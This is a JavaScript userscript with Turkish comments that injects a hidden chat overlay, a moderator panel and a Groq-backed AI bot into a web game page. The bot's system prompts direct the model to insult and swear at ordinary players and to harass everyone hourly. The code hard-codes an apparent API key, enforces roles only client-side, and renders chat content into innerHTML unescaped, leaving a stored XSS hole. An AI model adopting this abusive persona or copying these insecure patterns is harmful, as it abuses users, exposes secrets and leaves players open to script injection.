    let isAdmin = false;
    let isYonetim = false;
    window.aktifYetki = 0; // Yetkiyi globalde tutuyoruz

    const userRef = db.ref('lisanslar/' + aktifKullanici);

    // Eğer Firebase'de yetki alanı yoksa otomatik olarak 0 oluşturur
    userRef.child('yetki').once('value').then((snap) => {
        if (!snap.exists()) {
            userRef.update({ yetki: 0 });
        }
    });

    // Gerçek zamanlı yetki dinleyici ve Panel Görünürlük Kontrolü
    userRef.child('yetki').on('value', (snap) => {
        let y = snap.val() || 0;
        window.aktifYetki = y;
        isAdmin = (y === 1);
        isYonetim = (y === 2);

        // Yetkili paneli görünürlüğünü canlı ayarla
        const adminPanel = document.getElementById('mod_control_dashboard');
        if(adminPanel) {
            adminPanel.style.display = (isAdmin || isYonetim) ? 'block' : 'none';
        }
    });

    // 1. Menüye YK Butonunu Ekle
    const menuTableTr = document.querySelector('table[align="center"] tbody tr');
    if (menuTableTr && !document.getElementById('yk_chat_btn')) {
        const ykTd = document.createElement('td');
        ykTd.height = "20";
        ykTd.width = "140";
        ykTd.align = "center";
        ykTd.className = "select1";
        ykTd.innerHTML = `<a href="javascript:void(0);" id="yk_chat_btn" style="color:#FFD700; font-weight:bold; text-decoration:none;"><img src="https://r.resimlink.com/vgVLBDA.jpg" width="31" style="vertical-align: middle;"> YK Chat</a>`;
        menuTableTr.appendChild(ykTd);

        // 2. YK Chat Arayüzünü ve YETKİLİ PANELİNİ Oluştur
        const ykChatContainer = document.createElement('div');
        ykChatContainer.id = 'global_msg_wrapper';
        ykChatContainer.style.display = 'none';
        ykChatContainer.style.width = '100%';

        // Yönetim Paneli Arayüzü (Sadece yetkililer görecek)
        const yetkiliPaneliHTML = `
            <div id="mod_control_dashboard" style="display:none; background:#1a1a1a; padding:8px; border: 1px solid #8B0000; border-radius:5px; margin-bottom:10px;">
                <div style="margin-bottom:8px;">
                    <button id="yk_btn_loglar" style="background:#555; color:white; border:none; padding:5px 10px; border-radius:3px; cursor:pointer; font-weight:bold; font-size:11px; margin-right:5px;">??? Logları Gör</button>
                    <button id="yk_btn_muteler" style="background:#8B0000; color:white; border:none; padding:5px 10px; border-radius:3px; cursor:pointer; font-weight:bold; font-size:11px;">?? Mute Yönetimi</button>
                </div>

                <div id="yk_log_alani" style="display:none; background:#111; max-height:200px; overflow-y:auto; padding:5px; border:1px solid #444; font-size:11px; border-radius:3px;">
                    <div style="color:#FFD700; margin-bottom:5px;"><b>Son Silinen Mesajlar</b></div>
                    <div id="yk_log_liste_icerik" style="color:#ccc;">Yükleniyor...</div>
                </div>

                <div id="yk_mute_alani" style="display:none; background:#111; padding:5px; border:1px solid #444; font-size:11px; border-radius:3px;">
                    <div style="color:#FFD700; margin-bottom:5px;"><b>Yeni Mute At</b></div>
                    <input id="yk_mute_isim_input" placeholder="Kullanıcı Adı" autocomplete="off" style="width:120px; background:#333; color:white; border:1px solid #555; padding:4px; margin-right:3px;">
                    <input id="yk_mute_saat_input" type="number" placeholder="Saat" style="width:60px; background:#333; color:white; border:1px solid #555; padding:4px; margin-right:3px;">
                    <button id="yk_mute_onayla_btn" style="background:orange; color:white; border:none; padding:4px 10px; cursor:pointer; border-radius:3px; font-weight:bold;">Mute At</button>

                    <div style="color:#FFD700; margin-top:10px; margin-bottom:5px; border-top:1px solid #333; padding-top:5px;"><b>Aktif Muteler</b></div>
                    <div id="yk_aktif_muteler_listesi" style="max-height:120px; overflow-y:auto;"></div>
                </div>
            </div>
        `;

        ykChatContainer.innerHTML = yetkiliPaneliHTML + `
            <!-- Yüzen GIF Seçme Penceresi -->
            <div id="yk_gif_penceresi" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:rgba(23, 37, 58, 0.98); padding:15px; border-radius:10px; z-index:10000; width:300px; max-height:400px; overflow-y:auto; border:2px solid #667eea;">
                <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                    <h3 style="color:white; margin:0; font-size:16px;">GIF Seç</h3>
                    <button onclick="document.getElementById('yk_gif_penceresi').style.display='none'" style="background:red; color:white; border:none; border-radius:50%; width:25px; height:25px; cursor:pointer;">X</button>
                </div>
                <div id="yk_kullanici_gif_listesi" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px;"></div>
            </div>

            <table width="100%" style="margin-bottom: 5px;">
                <tr>
                    <td style="width: 45px;">
                        <!-- GIF Butonu -->
                        <button id="yk_chat_gif_btn" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border:none; padding:7px; border-radius:5px; color:white; cursor:pointer; font-weight:bold;">GIF</button>
                    </td>
                    <td>
                        <form id="yk_gonderilenform" onsubmit="return false;">
                            <input id="yk_chat_input" placeholder=" Mesajınızı Giriniz..." style="width: 100%; height: 30px; background-color:#111; color:#fff; border:1px solid #333; padding-left:5px;" autocomplete="off" />
                        </form>
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <!-- Seçilen GIF Önizleme Ekranı -->
                        <div id="yk_secilen_gif_onizleme" style="display:none; margin-top:5px; position:relative; width:max-content;">
                            <img id="yk_secilen_gif_img" src="" style="max-height:80px; border-radius:5px;">
                            <button onclick="window.iptalYkGif()" style="position:absolute; top:-5px; right:-5px; background:red; color:white; border:none; border-radius:50%; width:20px; height:20px; cursor:pointer; font-size:10px;">X</button>
                        </div>
                        <div id="yk_sohbet_yasak" style="margin-top:5px; font-weight:bold;"></div>
                    </td>
                </tr>
            </table>
            <div style="max-height: 400px; overflow-y: auto; background-color: transparent;">
                <table id="yk_sonuc" width="100%"></table>
            </div>
        `;

        const orjinalSonucTablosu = document.getElementById('sonuc');
        if (orjinalSonucTablosu) {
            orjinalSonucTablosu.parentNode.insertBefore(ykChatContainer, orjinalSonucTablosu);
        }

        // ==========================================
        // GİF FONKSİYONLARI BAŞLANGIÇ
        // ==========================================

        // Firebase'den GIF'leri Çek (Sadece Okuma)
        db.ref('yk_chat/gifler').on('value', snap => {
            const kullaniciListe = document.getElementById('yk_kullanici_gif_listesi');
            if(!kullaniciListe) return;
            let userHtml = '';
            snap.forEach(child => {
                let v = child.val();
                userHtml += `<div onclick="window.secYkGif('${v.url}')" style="cursor:pointer; border-radius:5px; overflow:hidden; border:2px solid transparent;">
                    <img src="${v.url}" style="width:100%; height:80px; object-fit:cover;">
                </div>`;
            });
            kullaniciListe.innerHTML = userHtml || '<span style="color:#888;">Henüz GIF eklenmemiş.</span>';
        });

        // GIF Penceresini Açma
        document.getElementById('yk_chat_gif_btn').addEventListener('click', () => {
            document.getElementById('yk_gif_penceresi').style.display = 'block';
        });

        // GIF Seçme, İptal ve Global Fonksiyonlar
        window.ykSeciliGifUrl = null;
        window.secYkGif = function(url) {
            window.ykSeciliGifUrl = url;
            document.getElementById('yk_secilen_gif_img').src = url;
            document.getElementById('yk_secilen_gif_onizleme').style.display = 'block';
            document.getElementById('yk_gif_penceresi').style.display = 'none';
        };
        window.iptalYkGif = function() {
            window.ykSeciliGifUrl = null;
            document.getElementById('yk_secilen_gif_img').src = '';
            document.getElementById('yk_secilen_gif_onizleme').style.display = 'none';
        };

        // ==========================================
        // YETKİLİ PANELİ FONKSİYONLARI BAŞLANGIÇ
        // ==========================================

        // Logları Göster/Gizle
        document.getElementById('yk_btn_loglar').addEventListener('click', () => {
            const logAlani = document.getElementById('yk_log_alani');
            const muteAlani = document.getElementById('yk_mute_alani');
            muteAlani.style.display = 'none';
            logAlani.style.display = logAlani.style.display === 'none' ? 'block' : 'none';

            if(logAlani.style.display === 'block') {
                db.ref('yk_chat/silinen_loglar').limitToLast(50).once('value', snap => {
                    let html = '';
                    let loglar = [];
                    snap.forEach(child => { loglar.push(child.val()); });
                    // Yeniden eskiye sırala
                    loglar.reverse().forEach(log => {
                        html += `<div style="border-bottom:1px dashed #333; padding:5px 0;">
                            <span style="color:red; font-weight:bold;">${log.silen_yetkili}</span> sildi (${log.tarihi}):<br>
                            <span style="color:#FFD700;">${log.mesajin_sahibi}:</span> <span style="color:#aaa;">${log.silinen_mesaj}</span>
                        </div>`;
                    });
                    document.getElementById('yk_log_liste_icerik').innerHTML = html || 'Henüz silinen bir log bulunamadı.';
                });
            }
        });

        // Mute Panelini Göster/Gizle
        document.getElementById('yk_btn_muteler').addEventListener('click', () => {
            const logAlani = document.getElementById('yk_log_alani');
            const muteAlani = document.getElementById('yk_mute_alani');
            logAlani.style.display = 'none';
            muteAlani.style.display = muteAlani.style.display === 'none' ? 'block' : 'none';
        });

        // Yeni Mute Atma İşlemi
        document.getElementById('yk_mute_onayla_btn').addEventListener('click', () => {
            let isim = document.getElementById('yk_mute_isim_input').value.trim();
            let saat = parseFloat(document.getElementById('yk_mute_saat_input').value);

            if(isim && saat > 0) {
                let bitisZamani = Date.now() + (saat * 60 * 60 * 1000);
                db.ref('yk_chat/muteler/' + isim).set({
                    bitisTarihi: bitisZamani,
                    cezayi_veren: aktifKullanici,
                    tarihi: new Date().toLocaleString('tr-TR')
                }).then(() => {
                    document.getElementById('yk_mute_isim_input').value = '';
                    document.getElementById('yk_mute_saat_input').value = '';
                });
            } else {
                alert("Lütfen geçerli bir kullanıcı adı ve saat değeri girin!");
            }
        });

        // Aktif Muteleri Canlı Dinle ve Göster
        db.ref('yk_chat/muteler').on('value', snap => {
            const liste = document.getElementById('yk_aktif_muteler_listesi');
            if(!liste) return;

            let html = '';
            const simdi = Date.now();

            snap.forEach(child => {
                let isim = child.key;
                let v = child.val();
                let kalanMs = v.bitisTarihi - simdi;

                if(kalanMs > 0) {
                    let kalanDk = Math.ceil(kalanMs / 60000);
                    let sureGosterimi = kalanDk > 60 ? (kalanDk/60).toFixed(1) + ' saat' : kalanDk + ' dk';

                    html += `
                    <div style="border-bottom:1px solid #333; padding:6px 0;">
                        <span style="color:#FFD700; font-weight:bold;">${isim}</span>
                        <span style="color:#888;">(Kalan: <span style="color:#ff4444;">${sureGosterimi}</span>)</span>
                        <button onclick="window.kaldirYkMute('${isim}')" style="background:#ff4444; color:white; border:none; padding:3px 8px; border-radius:3px; cursor:pointer; font-weight:bold; font-size:10px; margin-left:8px;">Kaldır</button>
                    </div>`;
                } else {
                    // Süresi dolan muteyi veritabanından temizle
                    db.ref('yk_chat/muteler/' + isim).remove();
                }
            });
            liste.innerHTML = html || '<span style="color:#888; font-style:italic;">Şu an kimse susturulmamış.</span>';
        });

        // ==========================================
        // YETKİLİ PANELİ FONKSİYONLARI BİTİŞ
        // ==========================================

        // 3. Tıklama ile Geçiş (Orijinal <-> YK)
        document.getElementById('yk_chat_btn').addEventListener('click', function() {
            const oChat = document.getElementById('sonuc');
            const oForms = document.querySelectorAll('form:not(#yk_gonderilenform)');
            const oInputTimeout = document.getElementById('input_timeout');
            const oAlert = document.getElementById('alert');
            const oGidenVeri = document.getElementById('gidenveri1');

            if (ykChatContainer.style.display === 'none') {
                // Orijinalleri Gizle, YK Chat Aç
                if(oChat) oChat.style.display = 'none';
                oForms.forEach(f => f.style.display = 'none');
                if(oInputTimeout) oInputTimeout.style.display = 'none';
                if(oAlert) oAlert.style.display = 'none';
                if(oGidenVeri) oGidenVeri.style.display = 'none';

                ykChatContainer.style.display = 'block';
                this.style.color = '#ff4444';
            } else {
                // Orijinalleri Aç, YK Chat Gizle
                if(oChat) oChat.style.display = 'table';
                oForms.forEach(f => f.style.display = 'block');
                if(oInputTimeout) oInputTimeout.style.display = 'block';
                if(oAlert) oAlert.style.display = 'block';
                if(oGidenVeri) oGidenVeri.style.display = 'block';

                ykChatContainer.style.display = 'none';
                this.style.color = '#FFD700';
            }
        });

        /// 4. Firebase Chat İşlemleri
        const chatRef = db.ref('yk_chat/mesajlar');

        window.sonMesajGondermeZamani = 0; // 5 Saniye kontrolü için sayaç

        function ykMesajGonder() {
            const input = document.getElementById('yk_chat_input');
            const val = input.value.trim();
            if (!val && !window.ykSeciliGifUrl) return;

// --- 5 SANİYE BEKLEME (SPAM) KONTROLÜ ---
if (!isAdmin && !isYonetim) {
    // Sadece admin VEYA yönetim DEĞİLSE bu zaman kontrolünü yap
    const simdi = Date.now();
    if (simdi - window.sonMesajGondermeZamani < 5000) {
        let kalanSaniye = Math.ceil((5000 - (simdi - window.sonMesajGondermeZamani)) / 1000);
        document.getElementById('yk_sohbet_yasak').innerHTML = `<font color="red"> Lütfen ${kalanSaniye} saniye bekleyin.</font>`;
        return; // İşlemi durdur
    }
}

// Önce kullanıcının Mute (Susturulma) durumunu kontrol et
db.ref('yk_chat/muteler/' + aktifKullanici).once('value').then(snap => {
    if (snap.exists()) {
        let bitis = snap.val().bitisTarihi;
        if (Date.now() < bitis) {
            let kalanDk = Math.ceil((bitis - Date.now()) / 60000);
            document.getElementById('yk_sohbet_yasak').innerHTML = `<font color="red">Sohbet yasağı aldınız. Yeniden mesaj gönderebilmek için ${kalanDk} dakika beklemelisiniz.</font>`;
            input.value = "";
            return;
        } else {
            // Süre dolmuş, cezayı kaldır ve gönder
            db.ref('yk_chat/muteler/' + aktifKullanici).remove();
            document.getElementById('yk_sohbet_yasak').innerHTML = "";
            gonderIsleminiTamamla();
        }
    } else {
        // Mute yoksa mesajı gönder (Adminler ve Mute'suz oyuncular buraya düşer ve mesaj 1 kere gider)
        gonderIsleminiTamamla();
    }
});

function gonderIsleminiTamamla() {
    // Mesaj atıldı, sayacı güncelle ve uyarıyı temizle
    window.sonMesajGondermeZamani = Date.now();
    document.getElementById('yk_sohbet_yasak').innerHTML = "";

    let gidenText = val;
    let gidenGif = window.ykSeciliGifUrl ? window.ykSeciliGifUrl : "";

    const msgId = 'msg_' + Date.now();
    const saat = new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });

    chatRef.child(msgId).set({
        gonderen: aktifKullanici,
        mesaj: gidenText,
        gif: gidenGif,
        zaman: saat,
        yetki: window.aktifYetki,
        timestamp: firebase.database.ServerValue.TIMESTAMP
    });

    input.value = "";
    window.iptalYkGif();
}
        }

        document.getElementById('yk_chat_input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                ykMesajGonder();
            }
        });
// ==========================================
        // GERÇEK AI BOT SİSTEMİ BAŞLANGIÇ (GROQ) KESİN ÇÖZÜM
        // ==========================================

        const AI_API_KEY = "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";

        async function grokYapayZekaCevapAl(kullaniciMesaji, kullaniciAdi, ozelDurum = false) {
            const endpoint = "https://api.groq.com/openai/v1/chat/completions";

            let systemPrompt = "";

            // KURAL 1: EĞER KULLANICI YÖNETİM İSE (Yapay zekanın kafası karışmasın diye kodla ayırdık)
            if (kullaniciAdi === "YÖNETİM") {
                systemPrompt = `Sen YK City oyununun botu küçük YK'sın.. Karşındaki kişi senin patronun ve yaratıcın olan YÖNETİM. Ona karşı AŞIRI saygılı, itaatkar ve net ol. Asla küfür etme, şive yapma. Sorularına düzgün Türkçe ile mantıklı cevaplar ver. Her cümlende ona "Baba", "Babacığım" veya "Baş tacısın" diye hitap et.`;
            }
            // KURAL 2: NORMAL OYUNCULAR İSE
            else {
                systemPrompt = `Sen YK City oyununun botu küçük YK'sın.. Karşındaki kişi "${kullaniciAdi}". Sen sokak ağzıyla konuşan, aşırı küfürbaz, agresif ama çok zeki birisin. Karşındakini aşağıla, ağır argolar kullan ama SADECE BOŞ KÜFÜR ETME. Sana söylenenlere çok zekice, mantıklı ve lafı gediğine oturtan cevaplar ver. Çeviri gibi saçma cümleler kurma, tam bir Türk sokak serserisi gibi akıcı ve hatasız bir Türkçe ile konuş.`;
            }

            // KURAL 3: SAAT BAŞI SATAŞMASI
            if (ozelDurum) {
                systemPrompt = `Sen YK City oyununun agresif botu küçük YK'sın. Saat başı oldu. Oyundaki herkese (Yönetim hariç) Çorum şivesiyle ve sokak ağzıyla ağır küfürler ederek sataş. "Saat başı oldu hala buradasınız gidin yatın lan" temalı zekice ve akıcı Türkçe ile laflar sok.`;
            }

            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${AI_API_KEY}`
                    },
                    body: JSON.stringify({
                        // DİKKAT: MODELİ ÇOK DAHA ZEKİ OLAN 70B İLE DEĞİŞTİRDİK
                        model: "llama-3.3-70b-versatile",
                        messages: [
                            { role: "system", content: systemPrompt },
                            { role: "user", content: kullaniciMesaji }
                        ],
                        temperature: 0.85,
                        max_tokens: 150
                    })
                });
                const data = await response.json();

                if (data.choices && data.choices[0].message.content) {
                    return data.choices[0].message.content;
                } else {
                    return "Sistemim karıştı lan, ne diyosun?";
                }
            } catch (error) {
                console.error("Yapay Zeka Ağ Hatası:", error);
                return "Ağda sıkıntı var, az ötede oynayın.";
            }
        }

        function grokMesajGonder(metin) {
            const msgId = 'msg_grok_' + Date.now();
            const saat = new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });

            db.ref('yk_chat/mesajlar').child(msgId).set({
                gonderen: 'GROK',
                mesaj: metin,
                gif: '',
                zaman: saat,
                yetki: 3,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }

        // --- HİÇBİR MESAJI KAÇIRMAYAN YENİ HAFIZA SİSTEMİ ---
        const islenenMesajlar = new Set();
        let ilkYuklemeBitti = false;

        // limitToLast(1) yerine 5 yapıyoruz ki anlık mesaj birikmesinde Firebase veri atlamasın
        const chatDinleyiciRef = db.ref('yk_chat/mesajlar').limitToLast(5);

        // 1. Sayfa ilk açıldığında geçmiş mesajların ID'sini hafızaya alıp susturuyoruz
        chatDinleyiciRef.once('value', (snap) => {
            snap.forEach(child => {
                islenenMesajlar.add(child.key);
            });
            ilkYuklemeBitti = true; // Kilit açıldı
        });

        // 2. Canlı mesajları dinliyoruz
        chatDinleyiciRef.on('child_added', (snapshot) => {
            if (!ilkYuklemeBitti) return;

            const data = snapshot.val();
            const mesajId = snapshot.key;

            if (!data) return;

            // KONTROL: Eğer mesaj ID'sini daha önce gördüysek işlem yapmadan geç!
            if (islenenMesajlar.has(mesajId)) return;

            // Mesaj yeni! Hafızaya ekle ki bir daha aynı mesaja dönmesin.
            islenenMesajlar.add(mesajId);

            // Hafıza çok şişip tarayıcıyı yormasın diye 100 mesajda bir eski kayıtları siliyoruz
            if (islenenMesajlar.size > 100) {
                const ilkEleman = islenenMesajlar.values().next().value;
                islenenMesajlar.delete(ilkEleman);
            }

            // Yetki kontrolü (Sadece Admin/Yönetim)
            if (window.aktifYetki === 1 || window.aktifYetki === 2) {

                // Kendi mesajlarını atla ve içinde @grok geçiyorsa cevapla
                if (data.gonderen !== 'GROK' && data.mesaj && data.mesaj.toLowerCase().includes('@grok')) {

                    // KİLİT MEKANİZMASINI SİLDİK. Artık her mesajı bağımsız olarak cevaplayacak.
                    setTimeout(async () => {
                        const aiCevap = await grokYapayZekaCevapAl(data.mesaj, data.gonderen, false);
                        if(aiCevap) grokMesajGonder(aiCevap);
                    }, 500);
                }
            }
        });

        // Saat başı sataşma döngüsü
        let sonSaatlikMesajGonderme = -1;
        setInterval(async () => {
            if (window.aktifYetki === 1 || window.aktifYetki === 2) {
                const suAn = new Date();
                if (suAn.getMinutes() === 0 && suAn.getHours() !== sonSaatlikMesajGonderme) {
                    sonSaatlikMesajGonderme = suAn.getHours();
                    const aiCevap = await grokYapayZekaCevapAl("Saat başı oldu, millete sataş.", "Herkes", true);
                    grokMesajGonder(aiCevap);
                }
            }
        }, 30000);
        // ==========================================
        // GERÇEK AI BOT SİSTEMİ BİTİŞ
        // ==========================================
        // Mesajları Canlı Dinle
        chatRef.orderByChild('timestamp').limitToLast(50).on('value', (snapshot) => {
            const box = document.getElementById('yk_sonuc');
            box.innerHTML = ''; // Tabloyu temizle

            const mesajlar = [];
            snapshot.forEach(child => {
                mesajlar.push({ id: child.key, ...child.val() });
            });

            mesajlar.reverse().forEach(msg => {
                const tr = document.createElement('tr');

               // --- ÜSTTE MESAJ ALTTA GİF GÖSTERİMİ ---
                let mesajIcerigi = msg.mesaj || "";
                let eklenecekGif = msg.gif || "";

                // Eskiden kalma sadece link atılmış mesajları patlamaması için kontrol ediyoruz
                const isEskiImage = (mesajIcerigi.match(/\.(jpeg|jpg|gif|png|webp)(\?.*)?$/i) != null) || mesajIcerigi.includes('tenor.com') || mesajIcerigi.includes('giphy.com');

                if (isEskiImage && eklenecekGif === "") {
                    // Eğer sadece link atılmış eski bir mesajsa
                    mesajIcerigi = `<img src="${mesajIcerigi}" style="max-width:200px; max-height:200px; border-radius:5px; margin-top:5px;">`;
                } else if (eklenecekGif !== "") {
                    // Yeni sistem: Hem mesaj var hem GIF var (veya sadece GIF var)
                    let gifHtml = `<br><img src="${eklenecekGif}" style="max-width:200px; max-height:200px; border-radius:5px; margin-top:5px;">`;
                    mesajIcerigi = mesajIcerigi !== "" ? (mesajIcerigi + gifHtml) : gifHtml;
                }

                // Kimlik, Renk ve İkon Belirleme (Gelişmiş Anonim Sistemi)
                let gosterilenIsim = "Anonymous";
                let ikon = "";
                let isimRenk = "#888888"; // Normal oyuncular (Yetkisizler) için gri anonim rengi

                // YENİ: Profil resmi için değişken oluşturuyoruz
                let avatarResmi = "NORMAL_OYUNCU_RESIM_LINKI_BURAYA";
// === GROK ÖZELLEŞTİRMESİ BAŞLANGIÇ ===
                if (msg.gonderen === 'GROK') {
                    gosterilenIsim = "GROK";
                    isimRenk = "#FFFFFF";
                    avatarResmi = "https://r.resimlink.com/Y9F7sXw-t6a.jpg";
                    ikon = `<img src='https://r.resimlink.com/56d_T-r0U.png' width='16' style='vertical-align:middle; margin-left:3px;' title='Doğrulanmış Bot'>`;
                }
                // === GROK ÖZELLEŞTİRMESİ BİTİŞ ===
                else if (msg.yetki === 1) {
                    isimRenk = "#0000FF"; // Admin mavisi
                    avatarResmi = "https://r.resimlink.com/B-9sg.png"; // MODERATÖR RESMİ

                    // Sadece yetkili biri bakıyorsa gerçek ismi görsün
                    if (isAdmin || isYonetim) {
                        gosterilenIsim = msg.gonderen + " (MODERATOR)";
                    } else {
                        // Yetkisi 0 olan normal oyuncular sadece MODERATOR yazısını görsün
                        gosterilenIsim = "MODERATOR";
                    }

                    // Moderatör İkonları: İletişim resmi ve Mavi Tik
                    ikon = `<img src='https://r.resimlink.com/B-9sg.png' width='16' style='vertical-align:middle; margin-left:3px;'>` +
                           `<img src='https://r.resimlink.com/56d_T-r0U.png' width='16' style='vertical-align:middle; margin-left:3px;'>`;

                } else if (msg.yetki === 2) {
                    isimRenk = "red";
                    avatarResmi = "https://r.resimlink.com/PaNQ4s.jpg"; // YÖNETİM RESMİ

                    // Yetkili biri bakıyorsa yönetimin arkasındaki gerçek ismi de görsün
                    if (isAdmin || isYonetim) {
                        gosterilenIsim = `YÖNETİM (${msg.gonderen})`;
                    } else {
                        gosterilenIsim = "YÖNETİM";
                    }

                    // Yönetim İkonları: Sırasıyla Uçak, Tesbih ve Kırmızı Tik
                    ikon = `<img src='https://r.resimlink.com/GDQfYjT.png' width='16' style='vertical-align:middle; margin-left:3px;'>` +
                           `<img src='https://r.resimlink.com/f6hZQw4E.png' width='16' style='vertical-align:middle; margin-left:3px;'>` +
                           `<img src='https://r.resimlink.com/SRXeryk.gif' width='16' style='vertical-align:middle; margin-left:3px;'>`;

                } else {
                    // STANDART OYUNCU MESAJI
                    avatarResmi = "https://r.resimlink.com/GdnaipSr.png"; // NORMAL OYUNCU RESMİ (Mevcut olanı korudum, isterseniz değiştirebilirsiniz)

                    // Eğer bakan kişi yetkiliyse gerçek ismi ve normal rengi göster
                    if (isAdmin || isYonetim) {
                        gosterilenIsim = msg.gonderen;
                        isimRenk = "#EEB571"; // Oyunun orijinal standart oyuncu turuncusu
                    }
                    ikon = ""; // Standart oyuncunun ikonu yoksa boş kalmasını garantiliyoruz
                }

                // Silme Butonu (Sadece Çöp Kutusu Emojisi - Mesajın Sonunda Gözükecek)
                let copKutusu = "";
                if (isAdmin || isYonetim) {
                    copKutusu = `<span onclick="window.silYkMesaj('${msg.id}', '${msg.gonderen}', '${msg.mesaj.replace(/'/g, "\\'")}')" style="cursor:pointer; margin-left:10px; font-size:14px;" title="Bu mesajı sil">???</span>`;
                }

                tr.innerHTML = `
                    <td class='shbt'>
                        <img src='${avatarResmi}' style='width:37px;height:37px;border-radius:100%;vertical-align:middle;'> <br>
                        <font size='2px' color='white'> ${msg.zaman} </font>
                    </td>
                    <td class='bubble'>
                        <font color='${isimRenk}'>${gosterilenIsim}</font> ${ikon} <br>
                        ${mesajIcerigi} ${copKutusu}
                    </td>
                `;
                box.appendChild(tr);
             });
          });
        // Global Silme Fonksiyonu
        window.silYkMesaj = function(id, msgGonderen, msgIcerik) {
            if(isAdmin || isYonetim) {
                if(confirm('Mesajı silmek istediğinize emin misiniz?')) {
                    // Silinen mesajı yk_chat/silinen_loglar dizinine kopyala
                    db.ref('yk_chat/silinen_loglar').push({
                        orjinal_id: id,
                        mesajin_sahibi: msgGonderen,
                        silinen_mesaj: msgIcerik,
                        silen_yetkili: aktifKullanici,
                        tarihi: new Date().toLocaleString('tr-TR')
                    });
                    // Orijinal mesajı yok et
                    chatRef.child(id).remove();
                }
            }
        };

        // Global Mute Kaldırma Fonksiyonu
        window.kaldirYkMute = function(hedefKullanici) {
            if(isAdmin || isYonetim) {
                db.ref('yk_chat/muteler/' + hedefKullanici).remove();
            }
        };
    }
}
} // <--- baslatOtomasyon fonksiyonunu kapatan süslü parantez

// ==========================================================
// YK GİZLİ SOHBET AĞI SONU
// ==========================================================

    // ==========================================================
    // 4. BAŞLATICI KONTROL
    // ==========================================================
    const kayitliKullanici = localStorage.getItem('yk_auth_user');
    const kayitliSifre = localStorage.getItem('yk_auth_key');

    if (kayitliKullanici && kayitliSifre) {
        baslatOtomasyon(kayitliKullanici);
    } else {
        lisansEkraniOlustur();
    }

})();